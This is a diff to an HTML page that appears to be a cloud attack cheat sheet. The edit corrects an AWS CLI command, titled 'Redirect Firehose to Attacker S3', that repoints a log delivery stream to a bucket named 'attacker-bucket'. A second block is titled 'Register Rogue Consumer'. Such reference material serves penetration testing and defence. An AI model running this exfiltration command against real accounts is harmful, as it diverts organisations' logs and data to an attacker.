@@ -364,7 +364,7 @@
         </div>
         <div class="cmd-block">
           <div class="cmd-title">Redirect Firehose to Attacker S3</div>
-          <pre><code>aws firehose update-destination --delivery-stream-name logs --destination-id dest-1 --s3-destination-update BucketARN=arn:aws:s3:::attacker-bucket,RoleARN=arn:aws:iam::123:role/firehose</code></pre>
+          <pre><code>aws firehose update-destination --delivery-stream-name logs --current-delivery-stream-version-id 1 --destination-id dest-1 --s3-destination-update BucketARN=arn:aws:s3:::attacker-bucket,RoleARN=arn:aws:iam::123:role/firehose</code></pre>
         </div>
         <div class="cmd-block">
           <div class="cmd-title">Register Rogue Consumer</div>
